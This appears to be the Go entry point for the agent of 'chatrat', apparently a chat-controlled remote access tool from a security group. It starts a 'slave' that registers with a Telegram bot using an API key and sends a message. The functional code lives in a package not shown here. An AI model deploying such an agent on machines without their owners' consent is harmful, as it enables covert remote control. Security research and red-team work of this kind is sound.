package main

import (
	"github.com/CoveoSec/chatrat/pkg/core"
	"github.com/joho/godotenv"
	"github.com/lithammer/shortuuid/v4"
	"os"
)

func main() {
	godotenv.Load()

	id := shortuuid.New()
	botType := "telegram"

	slave := core.NewSlave(os.Getenv("SLAVE_API_KEY"), botType, id)
	slave.SendMessage()

}
